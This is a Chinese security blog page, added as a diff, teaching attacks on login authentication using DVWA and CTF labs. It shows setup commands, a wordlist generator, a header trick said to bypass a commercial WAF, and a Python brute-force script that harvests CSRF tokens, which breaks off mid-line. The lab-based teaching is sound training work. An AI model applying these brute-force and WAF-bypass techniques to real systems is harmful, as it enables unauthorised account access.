@@ -1,0 +1,1290 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="QrYuOcgHntsSXYVGvWVZS98NACE7wP7Rx3KVbK2_F1s">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-128x128-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content=",,,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离沫凌天๓" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="认证技术身份认证技术是用于在计算机网络中确认操作者身份的一种有效的解决方法。 计算机网络世界中一切信息包括用户的身份信息都是用一组特定的数据来表示的，计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。身份认证攻击就是为了使用各种办法通过这层认证，突破作为防护网络资产的第一道关口，身份认证攻击在渗透测试中有着举足轻重的作用。 对于身份认证攻击可以直接进行爆破攻击，在配置不当的">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="website">
+<meta property="og:title" content="身份认证技术">
+<meta property="og:url" content="https://winthorlimo.github.io/渗透测试/身份认证技术.html">
+<meta property="og:site_name" content="离沫凌天๓">
+<meta property="og:description" content="认证技术身份认证技术是用于在计算机网络中确认操作者身份的一种有效的解决方法。 计算机网络世界中一切信息包括用户的身份信息都是用一组特定的数据来表示的，计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。身份认证攻击就是为了使用各种办法通过这层认证，突破作为防护网络资产的第一道关口，身份认证攻击在渗透测试中有着举足轻重的作用。 对于身份认证攻击可以直接进行爆破攻击，在配置不当的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20200728141811750.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200802163842.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20200802235015381.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200803094635.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200803094831.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20190930070624566.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200809021235.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200809021341.png">
+<meta property="og:updated_time" content="2020-08-20T09:26:56.212Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="身份认证技术">
+<meta name="twitter:description" content="认证技术身份认证技术是用于在计算机网络中确认操作者身份的一种有效的解决方法。 计算机网络世界中一切信息包括用户的身份信息都是用一组特定的数据来表示的，计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。身份认证攻击就是为了使用各种办法通过这层认证，突破作为防护网络资产的第一道关口，身份认证攻击在渗透测试中有着举足轻重的作用。 对于身份认证攻击可以直接进行爆破攻击，在配置不当的">
+<meta name="twitter:image" content="http://qiniuyun.lintstar.top/image-20200728141811750.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://winthorlimo.github.io/渗透测试/身份认证技术.html">
+
+
+
+
+
+  <title>身份认证技术 | 离沫凌天๓</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离沫凌天๓</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">花开花落 一路上起起跌跌</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+	<h2 class="post-title" itemprop="name headline">身份认证技术</h2>
+
+
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <h1 id="认证技术"><a href="#认证技术" class="headerlink" title="认证技术"></a>认证技术</h1><p>身份认证技术是用于在计算机网络中<strong>确认操作者身份</strong>的一种有效的解决方法。 计算机网络世界中一切信息包括用户的身份信息都是用一组特定的数据来表示的，计算机只能识别用户的数字身份，所有<strong>对用户的授权</strong>也是针对<strong>用户数字身份的授权</strong>。身份认证攻击就是为了使用各种办法通过这层认证，突破作为防护网络资产的第一道关口，身份认证攻击在渗透测试中有着举足轻重的作用。</p>
+<p>对于身份认证攻击可以直接进行爆破攻击，在配置不当的情况下内网中还会经常遇到非授权访问。</p>
+<h1 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h1><h2 id="DWVA-靶场搭建"><a href="#DWVA-靶场搭建" class="headerlink" title="DWVA 靶场搭建"></a>DWVA 靶场搭建</h2><p>官方网站:<br><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a></p>
+<p>项目地址:<br><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p>
+<p>DVWA 是一个入门的 Web 安全学习靶场。这里直接去 Dokcer Hub 搜索一个容器来部署安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 拉取镜像</span><br><span class="line">docker pull sqreen/dvwa</span><br><span class="line"></span><br><span class="line"># 部署安装</span><br><span class="line">docker run -d -t -p 8888:80 sqreen/dvwa</span><br></pre></td></tr></table></figure>
+<p>然后本地浏览器访问 <a href="http://127.0.0.1:8888" target="_blank" rel="noopener">http://127.0.0.1:8888</a>，我们首先需要初始化一下 DVWA，相关的版本信息如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># MySQL root 用户密码为空</span><br><span class="line">$ mysql -e &quot;select version(),user()&quot;</span><br><span class="line">+---------------------------+----------------+</span><br><span class="line">| version()                 | user()         |</span><br><span class="line">+---------------------------+----------------+</span><br><span class="line">| 10.3.22-MariaDB-0+deb10u1 | root@localhost |</span><br><span class="line">+---------------------------+----------------+</span><br><span class="line"></span><br><span class="line"># PHP 7.3.14 版本</span><br><span class="line">$ php -v</span><br><span class="line">PHP 7.3.14-1~deb10u1 (cli) (built: Feb 16 2020 15:07:23) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.3.14, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.3.14-1~deb10u1, Copyright (c) 1999-2018, by Zend Technologies</span><br><span class="line"></span><br><span class="line"># Apache 版本为 2.4.38</span><br><span class="line">$ apache2 -v</span><br><span class="line">Server version: Apache/2.4.38 (Debian)</span><br><span class="line">Server built:   2019-10-15T19:53:42</span><br><span class="line"></span><br><span class="line"># 内核版本</span><br><span class="line">$ uname -a</span><br><span class="line">Linux 57bb72d1c052 4.19.76-linuxkit #1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+<p>在 Web 安全领域暴力破解是一个基础技能，不仅需要好的字典，还需要具有灵活编写脚本的能力。</p>
+<h2 id="DVWA-基础爆破"><a href="#DVWA-基础爆破" class="headerlink" title="DVWA 基础爆破"></a>DVWA 基础爆破</h2><ul>
+<li>Low<ul>
+<li>GET 登录不够安全，一般使用 POST 方式进行登录</li>
+<li>用户名和密码都没有进行过滤</li>
+</ul>
+</li>
+<li>Medium<ul>
+<li>这个 Medium 级别的源码登录逻辑并没有啥变化，只是登录失败的时候会延时 2 秒，这样爆破的速度会慢一些，不过依然可以进行传统的暴力破解。</li>
+</ul>
+</li>
+</ul>
+<h2 id="CTFHub-Basic-基础认证爆破"><a href="#CTFHub-Basic-基础认证爆破" class="headerlink" title="CTFHub Basic 基础认证爆破"></a>CTFHub Basic 基础认证爆破</h2><p>官网：<a href="https://www.ctfhub.com/" target="_blank" rel="noopener">https://www.ctfhub.com/</a></p>
+<p>「CTFHub技能树」—「Web前置技能」—「HTTP协议」—「基础认证」：</p>
+<h2 id="四位纯数字爆破"><a href="#四位纯数字爆破" class="headerlink" title="四位纯数字爆破"></a>四位纯数字爆破</h2><p>简单编写一个代码用来练习数字爆破：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'pass'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'flag&#123;xxxxxxx&#125;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'pass is error &lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hint: isset(\$_REQUEST['pass'])"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="四种常见的-POST-提交数据方式"><a href="#四种常见的-POST-提交数据方式" class="headerlink" title="四种常见的 POST 提交数据方式"></a>四种常见的 POST 提交数据方式</h2><p>顺便提一下 四种常见的 POST 提交数据方式：</p>
+<h3 id="application-x-www-form-urlencoded"><a href="#application-x-www-form-urlencoded" class="headerlink" title="application/x-www-form-urlencoded"></a>application/x-www-form-urlencoded</h3><p>最常见的 POST 提交数据的方式了。浏览器的原生<code>&lt;form&gt;</code>表单，请求类似于下面这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded;charset=utf-8</span><br><span class="line"></span><br><span class="line">title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3</span><br></pre></td></tr></table></figure>
+<h3 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a>multipart/form-data</h3><p>另一个常见的 POST 数据提交的方式,这种方式一般用来上传文件，各大服务端语言对它也有着良好的支持。一个请求示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1</span><br><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;text&quot;</span><br><span class="line"></span><br><span class="line">title</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">PNG ... content of chrome.png ...</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure>
+<p>首先生成了一个 boundary 用于分割不同的字段，为了避免与正文内容重复，boundary 很长很复杂。</p>
+<p>然后 Content-Type 里指明了数据是以 multipart/form-data 来编码，本次请求的 boundary 是什么内容。</p>
+<p>消息主体里按照字段个数又分为多个结构类似的部分，每部分都是以 –boundary 开始，紧接着是内容描述信息，然后是回车，最后是字段具体内容（文本或二进制）。</p>
+<p>如果传输的是文件，还要包含文件名和文件类型信息。消息主体最后以 –boundary– 标示结束。</p>
+<p>表单演示：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>multipart/form-data 测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/php/brute.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pass"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="application-json"><a href="#application-json" class="headerlink" title="application/json"></a>application/json</h3><p>在越来越多的人把它作为请求头，用来告诉服务端消息主体是序列化后的 JSON 字符串。</p>
+<p>由于 JSON 规范的流行，除了低版本 IE 之外的各大浏览器都原生支持，服务端语言也都有处理 JSON 的函数，使用 JSON 不会遇上什么麻烦:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line"></span><br><span class="line">&#123;&quot;title&quot;:&quot;test&quot;,&quot;sub&quot;:[1,2,3]&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="text-xml"><a href="#text-xml" class="headerlink" title="text/xml"></a>text/xml</h3><p>一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范。典型的 XML-RPC 请求是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com HTTP/1.1</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">    &lt;methodName&gt;examples.getStateName&lt;/methodName&gt;</span><br><span class="line">    &lt;params&gt;</span><br><span class="line">        &lt;param&gt;</span><br><span class="line">            &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt;</span><br><span class="line">        &lt;/param&gt;</span><br><span class="line">    &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>
+<p>早期安全狗也曾出现过 WAF 缺陷，因为匹配过于严谨，一个空格导致安全狗被绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 原内容：</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------471463142114</span><br><span class="line"># 修改后 boundary后面加入空格。</span><br><span class="line">Content-Type: multipart/form-data; boundary =---------------------------471463142114</span><br></pre></td></tr></table></figure>
+<h2 id="带验证码爆破"><a href="#带验证码爆破" class="headerlink" title="带验证码爆破"></a>带验证码爆破</h2><p>实验环境：<a href="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php</a></p>
+<p>工具：Pkav HTTP Fuzzer</p>
+<p>Python 生成一个 3 位数的字典：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'dic.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                f.write(<span class="string">f'<span class="subst">&#123;x&#125;</span><span class="subst">&#123;y&#125;</span><span class="subst">&#123;z&#125;</span>\n'</span>)</span><br></pre></td></tr></table></figure>
+<p>使用 Pkav 的 HTTP Fuzz 测试工具进行爆破即可。</p>
+<h2 id="DVWA-High-带-Token-爆破"><a href="#DVWA-High-带-Token-爆破" class="headerlink" title="DVWA - High 带 Token 爆破"></a>DVWA - High 带 Token 爆破</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测用户的 token</span></span><br><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 过滤用户名和密码</span></span><br><span class="line">$user = $checkToken_GET[ <span class="string">'username'</span> ];</span><br><span class="line">$user = stripslashes( $user );</span><br><span class="line">$user = mysql_real_escape_string( $user );</span><br><span class="line">$pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">$pass = stripslashes( $pass );</span><br><span class="line">$pass = mysql_real_escape_string( $pass );</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据匹配</span></span><br><span class="line">$query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">$result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">  登录成功</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">  登录失败</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这一关增加了 token 的检测，从如下代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure>
+<p>Token 的值来源于 index.php，访问 index.php 查看源码信息，找到如下 token 的位置:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> DVWA_WEB_PAGE_TO_ROOT . <span class="string">'dvwa/includes/dvwaPage.inc.php'</span>;</span><br></pre></td></tr></table></figure>
+<p>追踪 dvwaPage.inc.php 找到 token 相关函数的定义：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkToken</span><span class="params">( $user_token, $session_token, $returnURL )</span> </span>&#123;  <span class="comment"># 校验 token</span></span><br><span class="line">    <span class="keyword">if</span>( $user_token !== $session_token || !<span class="keyword">isset</span>( $session_token ) ) &#123;</span><br><span class="line">        dvwaMessagePush( <span class="string">'CSRF token is incorrect'</span> );</span><br><span class="line">        dvwaRedirect( $returnURL );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateSessionToken</span><span class="params">()</span> </span>&#123;  <span class="comment"># 当前时间的 md5 值作为 token</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION[ <span class="string">'session_token'</span> ] ) ) &#123;</span><br><span class="line">        destroySessionToken();</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[ <span class="string">'session_token'</span> ] = md5( uniqid() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroySessionToken</span><span class="params">()</span> </span>&#123;  <span class="comment"># 销毁 token</span></span><br><span class="line">    <span class="keyword">unset</span>( $_SESSION[ <span class="string">'session_token'</span> ] );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tokenField</span><span class="params">()</span> </span>&#123;  <span class="comment"># 将 token 输出到 input 框中</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;input type='hidden' name='user_token' value='&#123;$_SESSION[ 'session_token' ]&#125;' /&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后登陆的数据包如下:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerabilities/brute/index.php?username=admin&amp;password=password&amp;Login=Login&amp;user_token=&#123;token&#125; HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p>需要在 user_token 的后面跟上之前从源码中获取到的 token 值，这是一个登陆的完整流程，下面使用 Python 脚本进行爆破。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(headers)</span>:</span></span><br><span class="line">    index_url = <span class="string">'http://127.0.0.1:8888/vulnerabilities/brute/index.php'</span></span><br><span class="line">    index_html = requests.get(url=index_url, headers=headers, timeout=<span class="number">3</span>).text</span><br><span 